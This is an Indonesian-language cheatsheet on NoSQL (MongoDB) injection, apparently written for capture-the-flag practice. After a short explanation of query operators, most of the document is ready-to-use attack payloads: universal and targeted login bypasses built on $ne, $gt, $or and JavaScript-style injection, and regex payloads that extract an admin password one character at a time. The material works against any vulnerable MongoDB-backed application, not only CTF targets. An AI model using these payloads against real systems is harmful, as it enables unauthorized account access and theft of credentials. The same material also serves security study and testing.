# NoSQL Injection Cheatsheet (CTF)

## Apa itu NoSQL Injection?

NoSQL Injection adalah teknik eksploitasi pada aplikasi yang menggunakan database NoSQL (seperti MongoDB, CouchDB, dsb) dengan cara menyisipkan query berbahaya melalui input user. Tujuannya mirip dengan SQL Injection, yaitu untuk mendapatkan akses tidak sah, bypass login, atau mengakses data sensitif.

---

## Karakteristik NoSQL (MongoDB)

- Tidak menggunakan SQL, tapi JSON-like query.
- Query biasanya dalam bentuk objek (misal: `{ "username": "admin" }`).
- Mendukung operator logika seperti `$ne`, `$gt`, `$lt`, `$in`, `$regex`, dll.

---

## Syntax & Operator Injection

## 1. Operator Penting MongoDB

| Operator | Fungsi                          | Contoh Penggunaan                                                                                          |
| -------- | ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `$ne`    | Not Equal (tidak sama dengan)   | `{ "username": { "$ne": "admin" } }`<br>Query user selain admin                                            |
| `$eq`    | Equal (sama dengan)             | `{ "age": { "$eq": 18 } }`<br>Query user dengan age=18                                                     |
| `$gt`    | Greater Than (lebih besar dari) | `{ "age": { "$gt": 18 } }`<br>Query user dengan age>18                                                     |
| `$lt`    | Less Than (lebih kecil dari)    | `{ "age": { "$lt": 18 } }`<br>Query user dengan age<18                                                     |
| `$in`    | Ada di dalam array              | `{ "role": { "$in": ["admin", "user"] } }`<br>Query user dengan role admin/user                            |
| `$nin`   | Tidak ada di dalam array        | `{ "status": { "$nin": ["inactive"] } }`<br>Query user dengan status selain inactive                       |
| `$regex` | Regular Expression (pola)       | `{ "username": { "$regex": ".*ad.*" } }`<br>Query username yang mengandung 'ad'                            |
| `$or`    | Salah satu kondisi benar        | `{ "$or": [ { "username": "admin" }, { "role": "admin" } ] }`<br>Query user username=admin atau role=admin |
| `$and`   | Semua kondisi benar             | `{ "$and": [ { "active": true }, { "age": { "$gt": 18 } } ] }`<br>Query user aktif dan age>18              |

---

## 2. Use Case NoSQL Injection

### Bypass Login & Payload Dasar

- **Bypass login universal:**

  ```json
  {
    "username": { "$ne": null },
    "password": { "$ne": null }
  }
  ```

  Payload:

  - username: `{ "$ne": null }`
  - password: `{ "$ne": null }`

- **Bypass login user tertentu:**

  - username: `admin`
  - password: `{ "$ne": "1" }`

- **Login tanpa password:**

  - username: `admin' || '1'=='1`
  - password: `apapun`

- **Menggunakan $or:**

  - username: `admin" }, "$or": [ {}, { "a":"a`
  - password: `" } ] //`

- **Regex Injection:**

  - username: `admin`
  - password: `{ "$regex": ".*" }`

- **Payload lain:**
  - username: `{ "$gt": "" }`
  - password: `{ "$ne": "" }`
  - username: `admin' && this.password.match(/.*/)//`

---

### Ekstraksi & Brute Force Password

- **Mengetahui panjang password:**

  ```json
  {
    "username": "admin",
    "password": { "$regex": ".{8}" }
  }
  ```

  Jika response berbeda, berarti password admin 8 karakter. Ubah angka untuk brute panjang.

- **Mengecek karakter pertama password:**

  ```json
  {
    "username": "admin",
    "password": { "$regex": "^a.*" }
  }
  ```

  Jika response true, berarti karakter pertama password adalah 'a'.

- **Mengecek karakter kedua password:**

  ```json
  {
    "username": "admin",
    "password": { "$regex": "^.b.*" }
  }
  ```

  Jika response true, berarti karakter kedua password adalah 'b'.

- **Brute force karakter per karakter:**
  Ulangi payload regex dengan kombinasi karakter pada posisi tertentu:

  ```json
  {
    "username": "admin",
    "password": { "$regex": "^.{3}c.*" }
  }
  ```

  Untuk cek karakter ke-4 adalah 'c'.

- **Cek password hanya huruf/angka:**

  ```json
  {
    "username": "admin",
    "password": { "$regex": "^[a-zA-Z0-9]+$" }
  }
  ```

  True jika password hanya terdiri dari huruf/angka.

- **Cek password mengandung string tertentu:**
  ```json
  {
    "username": "admin",
    "password": { "$regex": "flag" }
  }
  ```
  True jika password mengandung kata 'flag'.

---

---

## Tips & Trik NoSQL Injection di CTF

- Coba input JSON, array, dan operator MongoDB.
- Perhatikan error message dan response time.
- Gunakan tools seperti Burp Suite, Postman, atau curl untuk testing.
- Cek apakah aplikasi melakukan sanitasi input.
- Coba kombinasi payload untuk bypass login, enum data, atau dump data.

---

## Referensi

- [PayloadAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks - NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [OWASP - NoSQL Injection](https://owasp.org/www-community/attacks/NoSQL_Injection)

---
